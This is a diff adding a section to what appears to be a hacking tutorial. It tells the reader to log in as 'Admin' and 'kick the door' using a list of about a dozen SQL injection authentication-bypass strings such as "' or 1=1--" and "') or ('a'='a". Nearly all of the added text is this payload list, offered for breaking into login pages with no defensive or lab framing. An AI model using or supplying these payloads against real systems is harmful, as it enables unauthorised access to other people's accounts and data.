@@ -39,6 +39,52 @@ Once you find the login page, you’ll see:
 ```bash
 Username: ____________
 Password: ____________
+```
+Don’t knock. **Kick the door**.
+
+### You type:
+
+- **Username**: `Admin`  
+- **Password**: any of these mind-bending strings:
+```bash
+" or "x"="x
+```
+```bash
+') or ('x'='x
+```
+```bash
+' or 1=1--
+```
+```bash
+" or 1=1--
+```
+```bash
+or 1=1--
+```
+```bash
+' or a=a--
+```
+```bash
+" or "a"="a
+```
+```bash
+') or ('a'='a
+```
+```bash
+") or ("a"="a
+```
+```bash
+hi" or "a"="a
+```
+```bash
+hi" or 1=1 --
+```
+```bash
+hi' or 1=1 --
+```
+```bash
+'or'1=1'
+```
 
 
 
